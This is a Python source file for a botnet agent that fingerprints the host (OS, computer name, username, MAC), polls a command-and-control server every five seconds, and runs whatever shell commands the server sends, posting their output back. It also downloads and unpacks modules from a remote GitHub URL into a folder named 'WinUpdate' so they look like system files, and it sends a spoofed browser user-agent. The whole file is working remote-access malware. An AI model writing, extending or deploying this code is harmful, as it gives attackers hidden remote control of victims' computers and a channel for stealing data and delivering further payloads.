"""
Agent
[X] grab operating_system, computer_name, username
[X] Receive and output back to server (basic cmd commands)
[] load modules
[] run loaded modules

To load module: load nmap
To run module: nmap <params>
- in the bg, it will run nmap/nmap.exe <params>
"""

import json
import os
import re
import time
import uuid
import zipfile

import requests

INDEX_COMPUTER_NAME = 0
INDEX_USERNAME = 1
RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
API_METHOD_PUSH = 'push'
API_METHOD_GET = 'get'
API_METHOD_OUTPUT = 'output'
C2 = r'http://127.0.0.1:8000/api/{}/{}'
C2_MODULES_PATH = r'https://github.com/notclement/botnet-enumeration-network/raw/master/server_django/apps/api/modules/{}'
DISK_PATH = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
HEADERS = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}


def get_mac():
    """This function returns the first MAC address of the NIC of the PC
    without colon"""
    return ':'.join(re.findall('..', '%012x' % uuid.getnode())).replace(':', '')


def get_os():
    """Uses systeminfo to obtain the OS and OS Version
    Returns the concatenated string"""
    os_version = ''
    output_systeminfo = os.popen('systeminfo')
    for output in output_systeminfo.read().splitlines()[2:4]:
        info = re.match(RE_DATA_AFTER_MULTIPLE_SPACES, output)
        os_version += info.groups()[1]
        os_version += ' - '
    return os_version.rstrip(' -')


def get_computer_and_username():
    """Uses whoami to get the computer name and user name
    Returns it in a list"""
    output_whoami = os.popen('whoami')
    return output_whoami.read().strip().split('\\')


def process_response(post_object):
    """This function takes the response from the server and processes it"""
    # if post_object != '""':
    res_obj = json.loads(post_object)
    if len(post_object.split()) == 2 and post_object.split()[0] == 'load':
        # C2 is asking to load a module, so we will check if the module is
        # on disk or not, if not then we will download it from the server
        module_name = post_object.split()[1]
        path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
        if module_name in [dI for dI in os.listdir(DISK_PATH) if
                           os.path.isdir(
                               os.path.join(DISK_PATH, dI))]:
            print('module already loaded.')
            send_response(res_obj['session_id'],
                          '{} module already loaded.'.format(module_name))
        else:
            print("{} module not loaded.\nDownloading it..".format(
                module_name))

            with open(path_to_zip_file, 'wb') as file:
                response = requests.get(C2_MODULES_PATH.format(module_name),
                                        HEADERS)
                file.write(response.content)
            with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:
                zip_ref.extractall(DISK_PATH + '\\' + module_name)
            os.remove(path_to_zip_file)
            send_response(res_obj['session_id'],
                          '{} module loaded and ready to be used'.format(
                              module_name))
    # running specific modules
    elif post_object.split()[0] in get_loaded_modules():
        pass
    else:
        # If a command is received
        if len(post_object) != 2:  # means that there is a cmdline
            print('Sending output of "{}"'.format(res_obj['cmdline']))
            cmd_output = os.popen(res_obj['cmdline'])
            send_response(res_obj['session_id'], cmd_output.read(),
                          res_obj['cmdline'])
        else:
            print('No commands given.')


def get_loaded_modules():
    root = DISK_PATH
    return [item for item in os.listdir(root) if
            os.path.isdir(os.path.join(root, item))]


def send_response(sesh_id, output, cmd_given=""):
    if not output:
        output_obj = {'output': '{} is an invalid command.'.format(cmd_given)}
        requests.post(C2.format(get_mac(), sesh_id) + '/' + API_METHOD_OUTPUT,
                      data=output_obj)
    else:
        output_obj = {'output': output}
        requests.post(C2.format(get_mac(), sesh_id) + '/' + API_METHOD_OUTPUT,
                      data=output_obj)


def say_hello():
    """This function get the basic details of the current PC and sends it to
    the C2.
    The response from the C2 is then passed over to process_response to process"""
    post_object = {
        'operating_system': get_os(),
        'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
        'username': get_computer_and_username()[INDEX_USERNAME]
    }
    res = requests.post(C2.format(get_mac(), API_METHOD_GET), data=post_object)
    process_response(res.text)


def main():
    while True:
        say_hello()
        time.sleep(5)


if __name__ == '__main__':
    main()
